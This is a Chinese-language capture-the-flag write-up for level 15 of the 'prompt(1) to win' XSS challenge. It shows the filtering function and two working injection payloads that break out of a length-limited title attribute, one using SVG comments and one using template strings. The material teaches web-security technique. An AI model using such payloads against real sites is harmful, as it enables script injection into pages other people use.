## [[prompt(1) to win](http://prompt.ml)] [[Level F – Length2](http://prompt.ml/15)] [[解题报告](http://exp-blog.com/2019/03/25/pid-3730/)]

------

## 题目

```javascript
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```

## 解题报告

这题与 【[Level 7 - Length](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2007%20-%20Length)】 十分相似，区别在于：

- 长度限制从 12 放宽到 15
- `*` 被过滤，导致 JS 注释 `/* */` 不可用


------------

### 解法一：SVG 注释

换言之，要解决这题，就需要**使用另一种方法实现多行注释**。我第一时间想到的就是 HTML 注释 `<!--   -->` 。

但是这题在 HTML 中穿插着 JS 代码，而在默认 HTML 语境下， HTML 注释是没办法在 JS 代码中使用的。

为了解决这个问题，可以借助 `<svg>` 标签强制解析 XML 语法的特点：

在 `<svg>` 标签中若包含 JS 代码，即使使用 HTML 注释 `<!--   -->` 也是可以被成功解析的。

例如：

```html
<svg>
    <!-- xxxx -->
    <script>
        <!-- yyyy -->
        alert(1)
        <!-- zzzz -->
        alert(2)
    </script>
</svg>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/01.png)


------------

那么这题的答案的呼之欲出了，我们只需要最终构造成这样的代码即可：

```html
<p class="comment" title=""><svg><!--    " data-comment='{"id":0}'></p>
<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
<p class="comment" title="-->prompt<!--  " data-comment='{"id":2}'></p>
<p class="comment" title="-->(1)</script>" data-comment='{"id":3}'></p>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/02.png)

从而可以反推出这题的 payload 为（*注意此处去掉了前面测试时的全部空格，那些空格只是为了便于对齐观察注入点，没有什么作用，保留或删除均可*）： `"><svg><!--#--><script><!--#-->prompt<!--#-->(1)</script>`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/03.png)


------------

### 解法二：模板字符串

这题其实还有另一种解法，可以使用 [模板字符串](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings) 解题。

在 JS 中，可以使用 倒引号（或反引号）包围字符串，字符串中再以 `${expression}` 方式入表达式，这样表达式就会被执行，例如：

```javascript
<script>
    `<a="1" b='2'> ${prompt(1)} by exp`
</script>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/04.png)

回到这题，我们只需要最终构造成这样的代码即可：

```html
<p class="comment" title=""><script>`    " data-comment='{"id":0}'></p>
<p class="comment" title="${prompt(1)}   " data-comment='{"id":1}'></p>
<p class="comment" title="`</script>     " data-comment='{"id":2}'></p>
```

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/05.png)

从而可以反推出这题的 payload 为（*注意此处去掉了前面测试时的全部空格，那些空格只是为了便于对齐观察注入点，没有什么作用，保留或删除均可*）： 

```html
"><script>`#${prompt(1)}#`</script>
```

> 注：这个 payload 也可用于 【[Level 7 - Length](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/prompt/Level%2007%20-%20Length)】 。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2015%20-%20Length2/imgs/06.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
